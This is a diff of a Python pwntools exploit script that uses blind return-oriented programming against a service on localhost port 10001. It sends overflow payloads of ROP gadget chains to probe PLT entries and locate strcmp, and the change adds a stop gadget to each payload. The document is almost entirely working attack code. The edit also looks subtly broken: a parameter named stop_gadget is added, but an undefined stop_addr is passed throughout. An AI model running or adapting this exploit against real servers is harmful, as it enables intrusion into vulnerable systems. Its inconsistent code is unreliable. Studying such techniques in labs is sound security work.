@@ -1,6 +1,6 @@
 from pwn import *
 
-def get_strcmp(size = 72, plt_addr = 0x400570, num_entries = 10, brop_addr = 0x40078a):
+def get_strcmp(size = 72, plt_addr = 0x400570, num_entries = 10, brop_addr = 0x40078a, stop_gadget = 0x400545):
     
     # start before for false negative
     start_addr = plt_addr - 0x30
@@ -11,10 +11,10 @@ def get_strcmp(size = 72, plt_addr = 0x400570, num_entries = 10, brop_addr = 0x4
     for i in range(num_entries):
         probe = start_addr + i * 0x10
         
-        if (not call(probe, size, brop_addr, good, good) and
-            call(probe, size, brop_addr, good, bad) and
-            call(probe, size, brop_addr, bad, good) and
-            call(probe, size, brop_addr, bad, bad)):
+        if (not call(probe, size, brop_addr, stop_addr, good, good) and
+            call(probe, size, brop_addr, stop_addr, good, bad) and
+            call(probe, size, brop_addr, stop_addr, bad, good) and
+            call(probe, size, brop_addr, stop_addr, bad, bad)):
             
             return probe
         
@@ -23,13 +23,15 @@ def get_strcmp(size = 72, plt_addr = 0x400570, num_entries = 10, brop_addr = 0x4
 
 # return: 
 #    crash -> True; not crashed -> False
-def call(probe, size, brop_addr, arg1, arg2):
+def call(probe, size, brop_addr, stop_addr, arg1, arg2):
     payload = size * b'A'
     payload += p64(brop_addr + 0x7) # pop rsi ; pop r15 ; ret
     payload += p64(arg1) * 2
     payload += p64(brop_addr + 0x9) # pop rdi ; ret
     payload += p64(arg2)
     payload += p64(probe)
+    payload += p64(stop_addr)
+    payload += p64(bad)
     
     try:
         p = remote('127.0.0.1', 10001)
@@ -45,7 +47,7 @@ def call(probe, size, brop_addr, arg1, arg2):
     
     except Exception:
         p.close()
-        return call(probe, size, brop_addr, arg1, arg2)
+        return call(probe, size, brop_addr, stop_addr, arg1, arg2)
 
 strcmp_addr = get_strcmp()
 print("The address of strcmp is 0x%x" % strcmp_addr)
